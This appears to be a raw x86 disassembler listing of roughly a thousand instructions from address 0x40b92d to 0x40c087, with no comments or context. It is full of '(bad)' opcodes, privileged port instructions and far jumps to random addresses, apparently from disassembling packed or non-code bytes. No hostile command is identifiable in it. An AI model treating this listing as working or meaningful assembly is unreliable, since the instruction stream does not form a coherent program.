  40b92d:	stc    
  40b92e:	arpl   si,di
  40b930:	shl    DWORD PTR [edx+0x765191e5],cl
  40b936:	or     cl,BYTE PTR [edx-0x5571436a]
  40b93c:	push   ds
  40b93d:	pusha  
  40b93e:	mov    dh,0xad
  40b940:	jae    0x40b954
  40b942:	jmp    0xc6e2862c
  40b947:	pop    esp
  40b948:	xchg   DWORD PTR [esi],ebx
  40b94a:	push   cs
  40b94b:	call   0x5dcb:0xb2db59a3
  40b952:	push   ebp
  40b953:	jo     0x40b9b5
  40b955:	sbb    esp,eax
  40b957:	mov    ds:0x6f1445f0,eax
  40b95c:	jbe    0x40b990
  40b95e:	(bad)  
  40b95f:	fsubr  QWORD PTR [eax]
  40b961:	mov    ebp,0x9c3dc163
  40b966:	xor    al,0x21
  40b968:	adc    DWORD PTR [esi+0x53],ebp
  40b96b:	pop    esp
  40b96c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b96d:	icebp  
  40b96e:	scas   eax,DWORD PTR es:[edi]
  40b96f:	sub    al,0xc9
  40b971:	pop    ds
  40b972:	jecxz  0x40b928
  40b974:	fsubrp st(5),st
  40b976:	stos   DWORD PTR es:[edi],eax
  40b977:	jb     0x40b964
  40b979:	xchg   edx,eax
  40b97a:	test   BYTE PTR [eax+ebx*1-0x2b],dl
  40b97e:	sbb    al,0x57
  40b980:	(bad)  
  40b981:	xor    al,0x62
  40b983:	mov    ebx,0x7ae98892
  40b988:	call   0x2239de07
  40b98d:	sbb    esp,esi
  40b98f:	push   0x0
  40b991:	mov    ah,0x8f
  40b993:	xchg   ebx,eax
  40b994:	adc    BYTE PTR ss:[ecx],dl
  40b997:	lahf   
  40b998:	jmp    0x2e71bc7b
  40b99d:	iret   
  40b99e:	cwde   
  40b99f:	in     eax,0x6d
  40b9a1:	es inc esp
  40b9a3:	frstor [ebx]
  40b9a5:	sbb    al,0x5f
  40b9a7:	loope  0x40b934
  40b9a9:	in     al,0x86
  40b9ab:	xor    BYTE PTR [ebp-0x24],cl
  40b9ae:	xchg   esp,eax
  40b9af:	aaa    
  40b9b0:	inc    ecx
  40b9b1:	cmp    eax,0xc4cf576a
  40b9b6:	cmc    
  40b9b7:	call   0x566cbcd6
  40b9bc:	add    DWORD PTR [ebp+0x6f],edx
  40b9bf:	cmc    
  40b9c0:	jb     0x40ba33
  40b9c2:	data16 add BYTE PTR [edi+0x15],bh
  40b9c6:	pop    eax
  40b9c7:	std    
  40b9c8:	xchg   BYTE PTR [eax],bh
  40b9ca:	adc    ah,BYTE PTR [ecx-0x7a596fbe]
  40b9d0:	ins    DWORD PTR es:[edi],dx
  40b9d1:	mov    esi,0x77b6be0b
  40b9d6:	cdq    
  40b9d7:	push   es
  40b9d8:	in     al,dx
  40b9d9:	cli    
  40b9da:	fidiv  WORD PTR [ecx]
  40b9dc:	mov    ebp,0xedee15b7
  40b9e1:	mov    ds:0xcde9e241,al
  40b9e6:	lods   eax,DWORD PTR ds:[esi]
  40b9e7:	and    DWORD PTR [edx+eax*1+0x5f],ebp
  40b9eb:	push   0xe76a21a7
  40b9f0:	out    dx,eax
  40b9f1:	jmp    0x40b9c3
  40b9f3:	mov    edi,0x34bc78d
  40b9f8:	sub    ebx,ebx
  40b9fa:	(bad)  
  40b9fb:	jecxz  0x40ba41
  40b9fd:	mov    eax,ds:0xecad12c2
  40ba02:	mov    edi,0x912637d2
  40ba07:	pop    ebp
  40ba08:	inc    esp
  40ba09:	xor    esi,ebx
  40ba0b:	test   eax,0xe68852e4
  40ba10:	out    dx,eax
  40ba11:	cs push 0x32
  40ba14:	rol    eax,0xa9
  40ba17:	inc    edi
  40ba18:	popa   
  40ba19:	push   ecx
  40ba1a:	inc    esp
  40ba1b:	(bad)  
  40ba1d:	out    dx,al
  40ba1e:	fidivr WORD PTR [edi+0x5309466e]
  40ba24:	fwait
  40ba25:	jmp    0xc954:0x5056483c
  40ba2c:	inc    ecx
  40ba2d:	jae    0x40ba14
  40ba2f:	test   BYTE PTR [edx],ah
  40ba31:	call   0xecb8:0x13d3587b
  40ba38:	push   esi
  40ba39:	mov    DWORD PTR [esi],ebp
  40ba3b:	shl    BYTE PTR [ecx-0x27a9e9e8],0xb6
  40ba42:	loopne 0x40b9d0
  40ba44:	gs dec esi
  40ba46:	out    0x51,al
  40ba48:	add    ah,BYTE PTR [ebx+0x4a3ca4dc]
  40ba4e:	add    DWORD PTR [eax],ebp
  40ba50:	jbe    0x40ba7e
  40ba52:	idiv   dh
  40ba54:	and    eax,0x1eae62cf
  40ba59:	test   DWORD PTR [eax+eiz*8],0x308c9ac8
  40ba60:	loop   0x40ba84
  40ba62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba63:	jae    0x40ba45
  40ba65:	sbb    eax,0x5e59309e
  40ba6a:	pop    esi
  40ba6b:	fnstcw WORD PTR ds:0x8eecaee9
  40ba71:	stos   DWORD PTR es:[edi],eax
  40ba72:	fsub   st(1),st
  40ba74:	in     eax,0x58
  40ba76:	mov    ds:0xa3f0c5,al
  40ba7b:	adc    bl,0x58
  40ba7e:	in     al,dx
  40ba7f:	mov    dl,0x13
  40ba81:	xchg   ebp,eax
  40ba82:	mov    ebx,0xc2552ef
  40ba87:	mov    WORD PTR [ecx],gs
  40ba89:	push   esi
  40ba8a:	lea    eax,[edi+0x61dd5799]
  40ba90:	add    ah,dh
  40ba92:	dec    esi
  40ba93:	jbe    0x40baec
  40ba95:	jo     0x40ba26
  40ba97:	mov    ?,esp
  40ba99:	jmp    0xb368e7b8
  40ba9e:	dec    ebp
  40ba9f:	cs mov ebp,0xe5c04b9a
  40baa5:	pop    esi
  40baa6:	ins    DWORD PTR es:[edi],dx
  40baa7:	cli    
  40baa8:	push   ebx
  40baa9:	mov    bh,BYTE PTR [esi+0x69]
  40baac:	and    BYTE PTR [esi-0x16],dl
  40baaf:	idiv   BYTE PTR [esi+0x55fc05b2]
  40bab5:	test   DWORD PTR [ecx+0x48cf644d],eax
  40babb:	aad    0x2
  40babd:	pop    edi
  40babe:	hlt    
  40babf:	addr16 dec edx
  40bac1:	loop   0x40bb0a
  40bac3:	js     0x40bae3
  40bac5:	dec    eax
  40bac6:	mov    dl,0x9
  40bac8:	dec    ebp
  40bac9:	mov    ds:0xb0093f37,eax
  40bace:	adc    BYTE PTR [bx+si],dh
  40bad1:	aaa    
  40bad2:	lods   eax,DWORD PTR ds:[esi]
  40bad3:	iret   
  40bad4:	inc    esp
  40bad5:	(bad)  [eax+0x92c4475]
  40badb:	iret   
  40badc:	cdq    
  40badd:	mov    al,ds:0x56c045c9
  40bae2:	(bad)  
  40bae3:	mov    al,ds:0x8771086
  40bae8:	popa   
  40bae9:	ja     0x40ba83
  40baeb:	call   0x68f7:0xaf0d52c2
  40baf2:	repz aam 0x18
  40baf5:	repnz dec ecx
  40baf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baf8:	pop    ebp
  40baf9:	lods   al,BYTE PTR ds:[esi]
  40bafa:	aad    0xfb
  40bafc:	sub    DWORD PTR [eax+0x66],edi
  40baff:	push   ds
  40bb00:	pop    ss
  40bb01:	pop    ebx
  40bb02:	xlat   BYTE PTR ds:[ebx]
  40bb03:	sar    DWORD PTR [ecx-0x60d1f440],cl
  40bb09:	outs   dx,BYTE PTR ds:[esi]
  40bb0a:	call   0x3f8a3f08
  40bb0f:	lods   eax,DWORD PTR ds:[esi]
  40bb10:	xor    eax,0x8336adf
  40bb15:	or     esp,DWORD PTR [eax]
  40bb17:	shr    BYTE PTR [ecx],cl
  40bb19:	xchg   ebp,eax
  40bb1a:	inc    ebp
  40bb1b:	xchg   esi,eax
  40bb1c:	jl     0x40bb20
  40bb1e:	arpl   WORD PTR [ebx-0x4d],ax
  40bb21:	arpl   WORD PTR [ecx+0x77ab54f],sp
  40bb27:	fnstsw WORD PTR [ebx]
  40bb29:	push   ebp
  40bb2a:	cmp    BYTE PTR [edi-0x5d],dh
  40bb2d:	inc    ebx
  40bb2e:	sar    BYTE PTR [eax-0x67],1
  40bb31:	ud2    
  40bb33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb34:	mov    dl,0x99
  40bb36:	call   0xf4570dd5
  40bb3b:	arpl   WORD PTR [edx-0xb],bx
  40bb3e:	push   esp
  40bb3f:	shl    DWORD PTR [esi],cl
  40bb41:	mov    WORD PTR [edi+edi*8],es
  40bb44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb45:	stos   BYTE PTR es:[edi],al
  40bb46:	icebp  
  40bb47:	fist   WORD PTR ds:0x697d0fd
  40bb4d:	cmp    ecx,DWORD PTR [ecx+0x666173e6]
  40bb53:	sub    edi,DWORD PTR [esi]
  40bb55:	in     al,dx
  40bb56:	mov    edx,0x53b03e57
  40bb5b:	pop    eax
  40bb5c:	imul   edx,edi,0x3f
  40bb5f:	push   esp
  40bb60:	push   cs
  40bb61:	fiadd  WORD PTR [esi]
  40bb63:	push   esp
  40bb64:	or     DWORD PTR [ebx],ebp
  40bb66:	ins    DWORD PTR es:[edi],dx
  40bb67:	in     eax,dx
  40bb68:	das    
  40bb69:	test   al,0x2d
  40bb6b:	sub    BYTE PTR [esi+0x48f2ff79],bl
  40bb71:	shl    BYTE PTR [eax-0x17],cl
  40bb74:	xor    dh,0xd6
  40bb77:	ins    DWORD PTR es:[edi],dx
  40bb78:	xor    al,0xd9
  40bb7a:	push   0xffffffe9
  40bb7c:	(bad)  
  40bb7d:	cmc    
  40bb7e:	ds add eax,0x79a5b757
  40bb84:	inc    ecx
  40bb85:	inc    esp
  40bb86:	(bad)  
  40bb88:	stos   DWORD PTR es:[edi],eax
  40bb89:	jmp    0xa840:0x8fb813c7
  40bb90:	add    eax,0xeb1d9526
  40bb95:	add    al,0x4b
  40bb97:	pop    esi
  40bb98:	sbb    dh,ah
  40bb9a:	sub    eax,0x9fd87ce5
  40bb9f:	push   eax
  40bba0:	(bad)  
  40bba1:	aaa    
  40bba2:	imul   edx,DWORD PTR [edi+ebx*4-0x7a],0xd562d80f
  40bbaa:	cdq    
  40bbab:	cs pusha 
  40bbad:	xor    DWORD PTR [edi-0x9e80b5c],ecx
  40bbb3:	jb     0x40bb5d
  40bbb5:	sbb    BYTE PTR [esi-0x2],dh
  40bbb8:	mov    bl,0xde
  40bbba:	xor    cl,BYTE PTR [edi-0x2]
  40bbbd:	imul   ebp,DWORD PTR [ecx-0x63],0xc5c38c66
  40bbc4:	mov    cl,0x17
  40bbc6:	es (bad) 
  40bbc8:	pop    eax
  40bbc9:	sub    DWORD PTR [ebx+0x1981dc23],esi
  40bbcf:	fst    QWORD PTR [eax+0x61c71113]
  40bbd5:	xor    bl,BYTE PTR [ecx]
  40bbd7:	test   eax,0x76bc3f4f
  40bbdc:	add    dh,BYTE PTR [ecx]
  40bbde:	cmp    eax,0xb368f4ac
  40bbe3:	push   ebp
  40bbe4:	adc    eax,0x6e9847c6
  40bbe9:	pop    es
  40bbea:	daa    
  40bbeb:	dec    ebp
  40bbec:	mov    ds:0x1ceb2d8b,eax
  40bbf1:	dec    esi
  40bbf2:	retf   
  40bbf3:	in     eax,dx
  40bbf4:	fiadd  DWORD PTR [ebx+0x1f]
  40bbf7:	mov    esi,0x312f44
  40bbfc:	imul   esi,DWORD PTR [ebx],0x72
  40bbff:	adc    eax,0x72ad9256
  40bc04:	addr16 and al,0x59
  40bc07:	sub    eax,0xa267dcb9
  40bc0c:	push   0xe1f794b0
  40bc11:	aad    0xc1
  40bc13:	and    ah,dl
  40bc15:	pop    es
  40bc16:	into   
  40bc17:	sub    DWORD PTR [eax],0x3b
  40bc1a:	out    0x6a,eax
  40bc1c:	jl     0x40bbc8
  40bc1e:	pop    edx
  40bc1f:	das    
  40bc20:	int    0xe0
  40bc22:	dec    esi
  40bc23:	ds mov ebp,0xd6a46f0b
  40bc29:	jnp    0x40bc56
  40bc2b:	stc    
  40bc2c:	jae    0x40bc06
  40bc2e:	ds (bad) 
  40bc31:	adc    bl,ch
  40bc33:	mov    WORD PTR [eax+0x440d2bad],ds
  40bc39:	outs   dx,BYTE PTR ds:[esi]
  40bc3a:	push   ecx
  40bc3b:	retf   
  40bc3c:	test   al,0xd0
  40bc3e:	repnz xor ebx,DWORD PTR [ecx]
  40bc41:	mov    esi,0x3bd71862
  40bc46:	xor    eax,0xb9bbce41
  40bc4b:	push   0x58
  40bc4d:	sbb    DWORD PTR [ebp+esi*2+0x55],ebp
  40bc51:	xchg   ecx,eax
  40bc52:	aad    0x89
  40bc54:	leave  
  40bc55:	sub    edx,DWORD PTR [ebx]
  40bc57:	dec    edi
  40bc58:	rol    BYTE PTR [ebx-0x4a21851c],cl
  40bc5e:	push   0x6961eb13
  40bc63:	sub    eax,0x6ae1efa1
  40bc68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc69:	aas    
  40bc6a:	pop    ds
  40bc6b:	fnstenv [ecx+0x59]
  40bc6e:	sahf   
  40bc6f:	retf   0xafb3
  40bc72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc73:	inc    esp
  40bc74:	mov    ds:0x38a4773b,eax
  40bc79:	jnp    0x40bc96
  40bc7b:	mov    bh,0x70
  40bc7d:	jae    0x40bce1
  40bc7f:	jl     0x40bc7c
  40bc81:	out    0x93,eax
  40bc83:	jl     0x40bcbe
  40bc85:	ds repnz retf 
  40bc88:	scas   eax,DWORD PTR es:[edi]
  40bc89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc8a:	fadd   DWORD PTR [edx]
  40bc8c:	cmp    eax,0x882e73cd
  40bc91:	cmp    esi,esi
  40bc93:	sbb    al,0xd0
  40bc95:	add    esi,esp
  40bc97:	shl    BYTE PTR [ecx+ecx*4],cl
  40bc9a:	jnp    0x40bc51
  40bc9c:	push   0x6
  40bc9e:	push   ds
  40bc9f:	je     0x40bcca
  40bca1:	ds sbb eax,0x65f974eb
  40bca7:	pop    eax
  40bca9:	jno    0x40bc6d
  40bcab:	(bad)  
  40bcac:	(bad)
  40bcaf:	sbb    edi,edi
  40bcb1:	dec    sp
  40bcb3:	loopne 0x40bcd6
  40bcb5:	xchg   esi,eax
  40bcb6:	shl    BYTE PTR ds:[edi+0x4d979cc4],1
  40bcbd:	or     edx,DWORD PTR [edi]
  40bcbf:	adc    al,0xdf
  40bcc1:	fidiv  WORD PTR [ebx]
  40bcc3:	aas    
  40bcc4:	cmp    bl,BYTE PTR [eax-0x39c001b5]
  40bcca:	ins    DWORD PTR es:[edi],dx
  40bccb:	(bad)  
  40bccc:	mov    ebp,0x4ff6f885
  40bcd1:	xchg   ecx,eax
  40bcd2:	imul   esi,DWORD PTR [edx],0xbf81b75d
  40bcd8:	stc    
  40bcd9:	aad    0x97
  40bcdb:	cdq    
  40bcdc:	jmp    0x368eb619
  40bce1:	inc    eax
  40bce2:	sar    cl,0x7b
  40bce5:	dec    ebx
  40bce6:	adc    BYTE PTR [ebx],dh
  40bce8:	ficom  WORD PTR [eax]
  40bcea:	sbb    al,0x3e
  40bcec:	mov    dl,0x56
  40bcee:	mov    bl,0x2
  40bcf0:	je     0x40bc97
  40bcf2:	lock adc eax,0x57108fe7
  40bcf8:	or     al,0xee
  40bcfa:	dec    ebp
  40bcfb:	xor    eax,0x9447cf8a
  40bd00:	mov    al,ds:0x5dc639f7
  40bd05:	(bad)  
  40bd06:	aad    0x3d
  40bd08:	xchg   esp,eax
  40bd09:	jae    0x40bcd5
  40bd0b:	std    
  40bd0c:	jg     0x40bccf
  40bd0e:	mov    dl,0xa9
  40bd10:	pushf  
  40bd11:	ret    0xe8be
  40bd14:	out    dx,eax
  40bd15:	jnp    0x40bd79
  40bd17:	inc    edx
  40bd18:	loop   0x40bd89
  40bd1a:	icebp  
  40bd1b:	mov    edi,0xf409d562
  40bd20:	fisttp WORD PTR [ebp+0x51]
  40bd23:	cld    
  40bd24:	jno    0x40bd0c
  40bd26:	lock dec esi
  40bd28:	imul   eax,DWORD PTR [esi-0x3205032],0x7d
  40bd2f:	xor    esi,DWORD PTR [ebp+0x142010ac]
  40bd35:	dec    edi
  40bd36:	pop    ebx
  40bd37:	nop
  40bd38:	fcmovnu st,st(5)
  40bd3a:	mov    ch,0xc2
  40bd3c:	rol    BYTE PTR [ebx],1
  40bd3e:	nop
  40bd3f:	cs lods al,BYTE PTR cs:[esi]
  40bd42:	push   esi
  40bd43:	or     al,0xf6
  40bd45:	call   0xe6fbb9cd
  40bd4a:	sti    
  40bd4b:	jno    0x40bcff
  40bd4d:	xor    dh,BYTE PTR [edi+0x61]
  40bd50:	mov    dh,0xa6
  40bd52:	shl    BYTE PTR [ecx-0x6b],cl
  40bd55:	hlt    
  40bd56:	inc    edi
  40bd57:	das    
  40bd58:	dec    edi
  40bd59:	jmp    0x2c2e5d4d
  40bd5e:	aaa    
  40bd5f:	int3   
  40bd60:	mov    eax,ds:0x73ec0884
  40bd65:	dec    ecx
  40bd66:	adc    ah,bh
  40bd68:	mov    al,0xd5
  40bd6a:	(bad)  
  40bd6b:	loopne 0x40bd5f
  40bd6d:	pop    edi
  40bd6e:	mov    dl,bl
  40bd70:	push   esi
  40bd71:	mov    WORD PTR [edi-0x28],cs
  40bd74:	ins    BYTE PTR es:[edi],dx
  40bd75:	xchg   esi,eax
  40bd76:	pop    ebp
  40bd77:	or     BYTE PTR ds:0xefbd2705,dh
  40bd7d:	mov    ebx,0x47deb380
  40bd82:	xor    BYTE PTR [edx],al
  40bd84:	jb     0x40bda1
  40bd86:	js     0x40bd58
  40bd88:	in     al,0x68
  40bd8a:	lock mov cl,0x3a
  40bd8d:	stos   BYTE PTR es:[edi],al
  40bd8e:	jbe    0x40bd3a
  40bd90:	mov    cl,0x1
  40bd92:	arpl   WORD PTR [edi+edx*2-0x2d],dx
  40bd96:	inc    esi
  40bd97:	mov    edi,0xa7f47fb9
  40bd9c:	and    eax,0x77f79de9
  40bda1:	mov    ah,0xce
  40bda3:	fwait
  40bda4:	loope  0x40bde9
  40bda6:	nop
  40bda7:	stc    
  40bda8:	es pop ss
  40bdaa:	cmp    BYTE PTR [eax+0x1d],bh
  40bdad:	push   0x7fcee7aa
  40bdb2:	and    al,0x9
  40bdb4:	call   0xa42107e6
  40bdb9:	mov    ecx,0xeaf50052
  40bdbe:	outs   dx,DWORD PTR ds:[esi]
  40bdbf:	adc    eax,0x984cb40d
  40bdc4:	sar    ch,1
  40bdc6:	push   ecx
  40bdc7:	je     0x40be26
  40bdc9:	add    BYTE PTR [ebx+0x3710ec50],bh
  40bdcf:	stos   DWORD PTR es:[edi],eax
  40bdd0:	mov    ch,0x68
  40bdd2:	pop    es
  40bdd3:	call   0xc8b3:0x1a4bd827
  40bdda:	push   es
  40bddb:	xchg   ah,dl
  40bddd:	jb     0x40be44
  40bddf:	leave  
  40bde0:	xor    BYTE PTR ds:0x41792d76,dl
  40bde7:	ficomp DWORD PTR [esi+edi*1]
  40bdea:	fwait
  40bdeb:	dec    ebp
  40bdec:	dec    ecx
  40bded:	xchg   esi,eax
  40bdee:	test   esp,eax
  40bdf0:	(bad)  
  40bdf1:	js     0x40be42
  40bdf3:	mov    ebp,?
  40bdf5:	fdivr  DWORD PTR [esi+0x5aa75fb]
  40bdfb:	clc    
  40bdfc:	mov    bl,0x1f
  40bdfe:	repnz mov DWORD PTR [eax],ebp
  40be01:	std    
  40be02:	sub    al,0x4a
  40be04:	inc    eax
  40be05:	mov    cl,0x56
  40be07:	mov    al,0x34
  40be09:	daa    
  40be0a:	call   0xcba:0x8ea19aa0
  40be11:	inc    esp
  40be12:	mov    eax,ds:0xd1a1257f
  40be17:	leave  
  40be18:	adc    ebp,edx
  40be1a:	aad    0xd9
  40be1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be1d:	jb     0x40be30
  40be1f:	loope  0x40be45
  40be21:	push   esp
  40be22:	cld    
  40be23:	lea    ecx,[eax+0x2a]
  40be26:	or     dl,BYTE PTR [ebp-0x39]
  40be29:	cmc    
  40be2a:	jl     0x40be69
  40be2c:	rol    ah,1
  40be2e:	ret    
  40be2f:	cdq    
  40be30:	cmp    eax,0xa7d3ce30
  40be35:	pop    eax
  40be36:	cmp    BYTE PTR [ebp+0x5b],dl
  40be39:	fist   WORD PTR [ebp+0x6e587ee9]
  40be3f:	inc    ebx
  40be40:	das    
  40be41:	mov    esi,0x5aa2ab4
  40be46:	inc    ebx
  40be47:	jnp    0x40bea9
  40be49:	and    edx,esp
  40be4b:	enter  0xfc8b,0x5d
  40be4f:	and    ch,bh
  40be51:	push   ebp
  40be52:	push   edi
  40be53:	cmc    
  40be54:	mov    ebp,0xa52734a5
  40be59:	out    0x7e,eax
  40be5b:	xor    esi,edx
  40be5d:	mov    cl,0xc
  40be5f:	xor    ecx,eax
  40be61:	adc    DWORD PTR [edi-0x5be0cec6],esi
  40be67:	jecxz  0x40beb0
  40be69:	jmp    0xb4d6:0x61e6b98a
  40be70:	data16 jno 0x40be50
  40be73:	shl    BYTE PTR [edx+0x7c],1
  40be76:	or     esp,DWORD PTR [ebx-0x5e]
  40be79:	mov    ds,WORD PTR [ebx]
  40be7b:	push   ds
  40be7c:	test   DWORD PTR [eax],ebx
  40be7e:	inc    edi
  40be7f:	adc    bl,BYTE PTR [eax]
  40be81:	jp     0x40be90
  40be83:	out    0x84,al
  40be85:	lahf   
  40be86:	sub    al,0xda
  40be88:	mov    ch,0xac
  40be8a:	cmc    
  40be8b:	xchg   edi,eax
  40be8c:	into   
  40be8d:	aam    0x28
  40be8f:	mov    edi,0xe14eeb9d
  40be94:	mov    bl,0xdc
  40be96:	sbb    dl,ah
  40be98:	stc    
  40be99:	or     al,BYTE PTR [ebx-0x77]
  40be9c:	xor    BYTE PTR [edi],0xb4
  40be9f:	dec    ebp
  40bea0:	pop    eax
  40bea1:	pop    ebp
  40bea2:	adc    dl,BYTE PTR ds:0x6c19e0f1
  40bea8:	pop    ebx
  40bea9:	dec    esp
  40beaa:	add    al,0x91
  40beac:	pop    es
  40bead:	nop
  40beae:	rol    dh,cl
  40beb0:	cmp    al,0xcc
  40beb2:	sbb    ebx,DWORD PTR [edx-0xf]
  40beb5:	or     DWORD PTR [edx+esi*2],esi
  40beb8:	inc    eax
  40beb9:	lods   eax,DWORD PTR ds:[esi]
  40beba:	std    
  40bebb:	sahf   
  40bebc:	jne    0x40be50
  40bebe:	mov    ebx,0x6b0c3eff
  40bec3:	pop    es
  40bec4:	mov    BYTE PTR [edi],cl
  40bec6:	and    BYTE PTR [eax+0x33],0x54
  40beca:	dec    edx
  40becb:	pop    ecx
  40becc:	cmp    BYTE PTR [esi],ch
  40bece:	jg     0x40bee9
  40bed0:	add    eax,0xb71b3d77
  40bed5:	and    BYTE PTR [ebp+0x60],0xac
  40bed9:	or     eax,0xf3c47dfc
  40bede:	pop    ds
  40bedf:	mov    ?,esi
  40bee1:	hlt    
  40bee2:	scas   eax,DWORD PTR es:[edi]
  40bee3:	hlt    
  40bee4:	xchg   ebp,eax
  40bee5:	sub    al,0x6a
  40bee7:	sbb    BYTE PTR [edi],0x7a
  40beea:	jne    0x40bf11
  40beec:	stc    
  40beed:	mov    DWORD PTR [ecx+0x6a],ebx
  40bef0:	pusha  
  40bef1:	(bad)  [ebx]
  40bef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bef4:	xchg   esi,eax
  40bef5:	adc    ah,BYTE PTR [ebx]
  40bef7:	fs inc esp
  40bef9:	ds addr16 mov ebx,0xf1a2bbf3
  40bf00:	add    bh,al
  40bf02:	xchg   BYTE PTR [edi+0x416cde4c],dl
  40bf08:	ret    0x6383
  40bf0b:	into   
  40bf0c:	xor    DWORD PTR [esi],0xfffffffa
  40bf0f:	inc    esi
  40bf10:	lods   al,BYTE PTR ds:[esi]
  40bf11:	or     ecx,ebx
  40bf13:	mov    ecx,0xce465dd0
  40bf18:	fisubr DWORD PTR [ebx+0x22010a01]
  40bf1e:	push   0xffffff8e
  40bf20:	out    0x46,al
  40bf22:	mov    al,ds:0xd2d3e2a4
  40bf27:	pushf  
  40bf28:	scas   eax,DWORD PTR es:[edi]
  40bf29:	ins    BYTE PTR es:[edi],dx
  40bf2a:	sbb    al,0xf9
  40bf2c:	mov    bl,0xd3
  40bf2e:	mov    dh,0x73
  40bf30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf31:	xor    ecx,DWORD PTR [esi]
  40bf33:	mov    ebx,0x24f0db01
  40bf38:	call   0x7b473488
  40bf3d:	or     DWORD PTR [esi],edx
  40bf3f:	mov    ebp,0xb933f77d
  40bf44:	popf   
  40bf45:	lea    edx,[edi+ebx*2+0x78026020]
  40bf4c:	mov    ds:0xb9124cb4,eax
  40bf51:	aad    0x8b
  40bf53:	(bad)  
  40bf54:	and    DWORD PTR [esi-0x6796f8a6],esp
  40bf5a:	push   ecx
  40bf5b:	fisttp DWORD PTR [ebp-0x51]
  40bf5e:	daa    
  40bf5f:	and    ebp,edx
  40bf61:	in     al,0xff
  40bf63:	cmp    ah,al
  40bf65:	mov    ebx,0x7a893df3
  40bf6a:	pop    edx
  40bf6b:	inc    ebx
  40bf6c:	into   
  40bf6d:	pop    ebx
  40bf6e:	dec    edi
  40bf6f:	and    al,0x2a
  40bf71:	jp     0x40bfe3
  40bf73:	dec    edx
  40bf74:	add    eax,0xe47c020e
  40bf79:	sbb    ch,BYTE PTR [ebx-0xa]
  40bf7c:	hlt    
  40bf7d:	xchg   edi,eax
  40bf7e:	mov    dl,0xd3
  40bf80:	xchg   esp,eax
  40bf81:	mov    BYTE PTR [edi-0xb],cl
  40bf84:	(bad)  
  40bf85:	lock lods al,BYTE PTR ds:[esi]
  40bf87:	mov    DWORD PTR [ebp+0x78912fe1],edi
  40bf8d:	imul   esi,DWORD PTR [edi+0x5f],0x1f
  40bf91:	adc    esp,edi
  40bf93:	push   ebp
  40bf94:	repz jmp 0x621a:0x158b1dcf
  40bf9c:	add    al,0x28
  40bf9e:	popf   
  40bf9f:	mov    al,ds:0xc1759b8e
  40bfa4:	stc    
  40bfa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfa6:	daa    
  40bfa7:	mov    al,BYTE PTR [edx]
  40bfa9:	dec    esi
  40bfaa:	fild   DWORD PTR [edi+0x75772534]
  40bfb0:	adc    edi,DWORD PTR [edi]
  40bfb2:	lock sbb esi,esi
  40bfb5:	fs push edi
  40bfb7:	jmp    0x56e2:0xe50d0d97
  40bfbe:	jne    0x40c02b
  40bfc0:	clc    
  40bfc1:	pop    ds
  40bfc2:	sbb    ecx,DWORD PTR [esi-0x1db02c6a]
  40bfc8:	dec    esp
  40bfc9:	sti    
  40bfca:	jnp    0x40bf6f
  40bfcc:	jl     0x40c004
  40bfce:	pop    ss
  40bfcf:	sahf   
  40bfd0:	lods   al,BYTE PTR ds:[esi]
  40bfd1:	imul   eax,DWORD PTR [eax-0x3d],0x62
  40bfd5:	pop    ebx
  40bfd6:	outs   dx,BYTE PTR ds:[esi]
  40bfd7:	mov    ds:0xe96b92e0,al
  40bfdc:	xlat   BYTE PTR ds:[ebx]
  40bfdd:	jo     0x40bf9d
  40bfdf:	int    0xd5
  40bfe1:	push   ebx
  40bfe2:	xchg   BYTE PTR [eax+0x1c76727e],ah
  40bfe8:	js     0x40c01a
  40bfea:	push   edi
  40bfeb:	(bad)  
  40bfec:	pushf  
  40bfed:	lods   al,BYTE PTR ds:[esi]
  40bfee:	adc    al,0x1e
  40bff0:	(bad)  
  40bff1:	repnz sti 
  40bff3:	ds stos DWORD PTR es:[edi],eax
  40bff5:	call   0xc605:0x8fe6d5b
  40bffc:	xor    ebx,DWORD PTR [edx]
  40bffe:	(bad)  
  40bfff:	shr    DWORD PTR [eax-0x16043d4d],cl
  40c005:	cwde   
  40c006:	push   ecx
  40c007:	test   esp,0xf965b100
  40c00d:	add    eax,0x4bf33c39
  40c012:	xchg   ebp,eax
  40c013:	hlt    
  40c014:	push   si
  40c016:	and    eax,0x57c1697a
  40c01b:	cld    
  40c01c:	inc    ebp
  40c01d:	adc    eax,0xb872b60d
  40c022:	and    DWORD PTR [edx],0x5e
  40c025:	push   es
  40c026:	add    DWORD PTR [edx-0x4d781c8],eax
  40c02c:	mov    dl,0x81
  40c02e:	mov    ds:0x9d37da00,eax
  40c033:	arpl   cx,di
  40c035:	adc    BYTE PTR [esi-0x30],ah
  40c038:	pop    es
  40c039:	test   cl,0x3a
  40c03c:	cmp    bh,dl
  40c03e:	push   0x543a4416
  40c043:	std    
  40c044:	nop
  40c045:	mov    ?,WORD PTR [esi]
  40c047:	or     dl,BYTE PTR [ebx+0x17]
  40c04a:	xchg   esp,eax
  40c04b:	xor    BYTE PTR [edx+0x1b],ch
  40c04e:	std    
  40c04f:	fmul   DWORD PTR [ebx]
  40c051:	or     BYTE PTR [edx],0xb8
  40c054:	xchg   ebp,eax
  40c055:	sbb    BYTE PTR [edi-0x68cea6c9],bh
  40c05b:	and    dl,BYTE PTR [eax]
  40c05d:	mov    ch,BYTE PTR [esi-0x3d6c84ef]
  40c063:	pop    esp
  40c064:	sub    BYTE PTR [edx+esi*1],0x57
  40c068:	push   esi
  40c069:	and    edx,DWORD PTR [eax+0x27]
  40c06c:	stc    
  40c06d:	arpl   cx,si
  40c06f:	pushf  
  40c070:	sbb    al,bh
  40c072:	mov    dl,0xf1
  40c074:	pop    ds
  40c075:	pop    esi
  40c076:	sar    BYTE PTR [eax],0x87
  40c079:	mov    edi,esp
  40c07b:	retf   0xf59f
  40c07e:	cmp    ch,al
  40c080:	and    cl,BYTE PTR [ebx-0x5d1120df]
  40c086:	leave  
  40c087:	sub    BYTE PTR [edx-0x1c],bh
